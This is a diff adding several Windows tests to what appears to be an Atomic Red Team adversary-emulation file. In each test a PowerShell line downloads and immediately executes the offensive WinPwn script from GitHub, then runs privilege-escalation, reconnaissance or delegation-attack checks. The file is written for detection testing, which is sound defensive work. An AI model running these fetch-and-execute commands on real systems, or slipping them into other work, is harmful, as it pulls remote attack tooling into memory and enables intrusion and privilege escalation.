@@ -156,3 +156,79 @@ atomic_tests:
     command: |
       csrutil status
     name: sh
+- name: WinPwn - winPEAS
+  description:  Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      winPEAS -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - itm4nprivesc
+  description:  Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      itm4nprivesc -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - Powersploits privesc checks
+  description:  Powersploits privesc checks using oldchecks function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      oldchecks -noninteractive -consoleoutput
+    cleanup_command: |-
+      rm -force -recurse .\DomainRecon -ErrorAction Ignore
+      rm -force -recurse .\Exploitation -ErrorAction Ignore
+      rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
+      rm -force -recurse .\LocalRecon -ErrorAction Ignore
+      rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
+    name: powershell
+- name: WinPwn - General privesc checks
+  description:  General privesc checks using the otherchecks function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      otherchecks -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - GeneralRecon
+  description: Collect general computer informations via GeneralRecon function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      Generalrecon -consoleoutput -noninteractive
+    name: powershell
+- name: WinPwn - Morerecon
+  description: Gathers local system information using the Morerecon function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      Morerecon -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - RBCD-Check
+  description: Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      RBCD-Check -consoleoutput -noninteractive
+    name: powershell
